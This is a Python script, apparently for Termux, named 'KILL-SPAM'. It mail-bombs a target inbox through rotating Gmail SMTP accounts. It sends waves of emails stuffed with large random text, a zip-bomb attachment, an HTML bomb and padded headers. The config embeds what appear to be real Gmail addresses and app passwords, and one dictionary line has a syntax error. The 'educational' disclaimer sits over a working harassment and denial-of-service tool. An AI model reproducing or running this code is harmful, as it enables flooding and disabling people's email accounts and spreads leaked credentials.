#!/data/data/com.termux/files/usr/bin/python3
import smtplib
import time
import random
import string
import os
import threading
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from concurrent.futures import ThreadPoolExecutor, as_completed
import zipfile
import io

# ========== CONFIG ==========
SENDERS = [
    {
        "email": "tskforcests@gmail.com",
        "password": "zbdh eovg eosl ittv",
        "limit": 50,  # Reduced due to high volume
        "sent": 0
    },
    {
        "email": "stsvxpmain@gmail.com",
        "password": "wkhq qgxy kqau idyu",
        "limit": 50,
        "sent": 0
    }
]

TARGET_EMAIL = "target@email.com"  # CHANGE TO TEST EMAIL YOU OWN
SUBJECT_PREFIX = "Report"
# ============================

# ATTACK MODES
ATTACK_MODES = {
    "TEXT_BOMB": 1,      # Large text content
    "ZIP_BOMB": 2,       # Compressed recursion
    "HTML_BOMB": 3,      HTML with resources
    "MIXED": 4           # All of the above
}

CURRENT_MODE = ATTACK_MODES["MIXED"]
LOG_FILE = "killspam_log.txt"
MAX_WORKERS = 5  # Conservative
WAVE_SIZE = 10   # Smaller batches due to size

def log(msg):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"[{timestamp}] {msg}"
    
    with open(LOG_FILE, "a") as f:
        f.write(entry + "\n")
    
    print(entry)

def clear_terminal():
    print("\033[H\033[J", end="")
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[+] KILL-SPAM v1.0 | [{timestamp}]")
    print("-" * 50)

def get_active_sender():
    for sender in SENDERS:
        if sender["sent"] < sender["limit"]:
            return sender
    return None

def generate_large_text(size_kb=100):
    """Generate text payload (size in KB)"""
    # Generate random text to avoid compression
    chars = string.ascii_letters + string.digits + " " * 10
    size = size_kb * 1024
    
    # Generate in chunks to avoid memory issues
    chunk_size = 10000
    result = []
    while len(result) * chunk_size < size:
        chunk = ''.join(random.choices(chars, k=min(chunk_size, size - len(result)*chunk_size)))
        result.append(chunk)
    
    return ''.join(result)

def create_zip_bomb():
    """Create a small zip that extracts to large size"""
    # Create in-memory zip with repeated content
    zip_buffer = io.BytesIO()
    
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
        # Add same file multiple times with different names
        large_content = "0" * 1000000  # 1MB of zeros (compresses well)
        
        for i in range(10):  # 10 files, each 1MB = 10MB extracted
            zipf.writestr(f"file_{i}.txt", large_content)
    
    zip_buffer.seek(0)
    return zip_buffer.getvalue()

def create_html_bomb():
    """Create HTML with many external resources"""
    html_template = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Large Document</title>
        <style>
            body {{ margin: 0; padding: 0; }}
            .block {{
                width: 100%;
                height: 1000px;
                background: repeating-linear-gradient(
                    45deg,
                    #606dbc,
                    #606dbc 10px,
                    #465298 10px,
                    #465298 20px
                );
            }}
        </style>
    </head>
    <body>
        <div id="content">
    """
    
    # Add many divs with unique IDs
    for i in range(1000):
        html_template += f'<div class="block" id="block{i}">Section {i}</div>\n'
    
    html_template += """
        </div>
        <!-- External resources -->
        <img src="https://via.placeholder.com/10000x10000/000000/FFFFFF?text=Large+Image" width="1" height="1">
        <img src="https://via.placeholder.com/5000x5000/FF0000/FFFFFF?text=Red+Image" width="1" height="1">
        <script>
            // Generate more content dynamically
            for(let i = 0; i < 100; i++) {
                let div = document.createElement('div');
                div.innerHTML = 'Dynamic content ' + i + ' '.repeat(1000);
                document.getElementById('content').appendChild(div);
            }
        </script>
    </body>
    </html>
    """
    
    return html_template

def create_email_payload(sender_email, attack_id):
    """Create email with attack payload"""
    msg = MIMEMultipart('mixed')
    msg['From'] = sender_email
    msg['To'] = TARGET_EMAIL
    msg['Subject'] = f"{SUBJECT_PREFIX} #{attack_id:04d}"
    
    # Always add text part
    text_size = random.randint(50, 500)  # 50-500KB text
    text_content = generate_large_text(text_size)
    text_part = MIMEText(text_content, 'plain', 'utf-8')
    msg.attach(text_part)
    
    # Add attack based on mode
    mode_choice = random.choice(list(ATTACK_MODES.keys())) if CURRENT_MODE == ATTACK_MODES["MIXED"] else CURRENT_MODE
    
    if mode_choice == "HTML_BOMB" or CURRENT_MODE == ATTACK_MODES["HTML_BOMB"]:
        html_content = create_html_bomb()
        html_part = MIMEText(html_content, 'html', 'utf-8')
        msg.attach(html_part)
    
    if mode_choice == "ZIP_BOMB" or CURRENT_MODE == ATTACK_MODES["ZIP_BOMB"]:
        try:
            zip_data = create_zip_bomb()
            attachment = MIMEBase('application', 'zip')
            attachment.set_payload(zip_data)
            encoders.encode_base64(attachment)
            attachment.add_header('Content-Disposition', 'attachment', filename=f'document_{attack_id}.zip')
            msg.attach(attachment)
        except Exception as e:
            log(f"Zip creation failed: {e}")
    
    # Add extra headers to increase size
    msg['X-Custom-Header'] = 'X' * 1000  # 1KB header
    msg['X-Additional-Data'] = 'A' * 5000  # 5KB header
    
    return msg

def send_heavy_email(sender_email, sender_password, attack_id):
    """Send a heavy email"""
    try:
        # Create heavy payload
        msg = create_email_payload(sender_email, attack_id)
        
        # Calculate approximate size
        email_size = len(msg.as_string()) / 1024  # Size in KB
        log(f"Email #{attack_id}: {email_size:.1f}KB")
        
        # Send
        server = smtplib.SMTP("smtp.gmail.com", 587, timeout=30)
        server.starttls()
        server.login(sender_email, sender_password)
        
        # Send raw email (supports large emails better)
        server.sendmail(sender_email, TARGET_EMAIL, msg.as_string())
        server.quit()
        
        return True, email_size
    except Exception as e:
        log(f"Failed #{attack_id}: {str(e)[:50]}")
        return False, 0

def execute_attack_wave(wave_num):
    """Execute one wave of heavy emails"""
    successful = 0
    total_size = 0
    wave_emails = 0
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = []
        
        while wave_emails < WAVE_SIZE:
            sender = get_active_sender()
            if not sender:
                break
            
            attack_id = sender["sent"] + 1
            future = executor.submit(send_heavy_email, sender["email"], sender["password"], attack_id)
            futures.append((future, sender))
            wave_emails += 1
            
            # Small delay between starts
            time.sleep(random.uniform(0.1, 0.5))
        
        # Collect results
        for future, sender in futures:
            success, size = future.result()
            if success:
                successful += 1
                total_size += size
                sender["sent"] += 1
    
    return successful, wave_emails, total_size

def main():
    clear_terminal()
    
    print("[!] WARNING: This tool is for educational/testing purposes only.")
    print("[!] Use only on email accounts you own and have permission to test.")
    print("[!] Your Gmail accounts WILL be banned quickly with this tool.")
    print("-" * 50)
    
    confirm = input("[?] Type 'YES' to continue: ")
    if confirm != "YES":
        print("[!] Cancelled.")
        return
    
    total_sent = 0
    total_successful = 0
    total_data_sent = 0  # in KB
    wave_count = 0
    
    # Reset counters
    for sender in SENDERS:
        sender["sent"] = 0
    
    try:
        while True:
            wave_count += 1
            
            # Check if any sender has capacity
            if get_active_sender() is None:
                log("All senders reached limit.")
                break
            
            # Display status
            clear_terminal()
            print(f"[+] KILL-SPAM v1.0 | Active")
            print("-" * 50)
            print(f"[∞] WAVE #{wave_count}")
            print(f"[≠] Total Sent: {total_sent}")
            print(f"[+] Successful: {total_successful}")
            print(f"[≈] Data Sent: {total_data_sent/1024:.1f}MB")
            print(f"[#] Accounts: {len(SENDERS)}")
            print("-" * 30)
            
            for i, sender in enumerate(SENDERS, 1):
                used = sender["sent"]
                limit = sender["limit"]
                print(f"[{i}] {sender['email'][:12]}...: {used}/{limit}")
            
            # Execute wave
            wave_success, wave_total, wave_data = execute_attack_wave(wave_count)
            
            total_sent += wave_total
            total_successful += wave_success
            total_data_sent += wave_data
            
            log(f"Wave {wave_count}: {wave_success}/{wave_total} sent, {wave_data/1024:.1f}MB data")
            
            # Check completion
            if get_active_sender() is None:
                break
            
            # Longer cooldown due to heavy emails
            cooldown = random.randint(60, 120)  # 1-2 minutes
            log(f"Cooldown: {cooldown}s")
            
            for remaining in range(cooldown, 0, -1):
                if remaining % 30 == 0 or remaining <= 10:
                    print(f"Next wave in: {remaining}s", end="\r")
                time.sleep(1)
            print(" " * 30, end="\r")
    
    except KeyboardInterrupt:
        log("Stopped by user")
    
    # Final report
    clear_terminal()
    print(f"[+] KILL-SPAM - COMPLETE")
    print("-" * 50)
    print(f"Waves executed: {wave_count}")
    print(f"Total emails sent: {total_sent}")
    print(f"Successful sends: {total_successful}")
    print(f"Total data sent: {total_data_sent/1024:.1f}MB")
    print(f"Success rate: {(total_successful/total_sent*100):.1f}%" if total_sent > 0 else "0%")
    print("-" * 50)
    
    for i, sender in enumerate(SENDERS, 1):
        print(f"Account {i}: {sender['sent']}/{sender['limit']}")

if __name__ == "__main__":
    main()
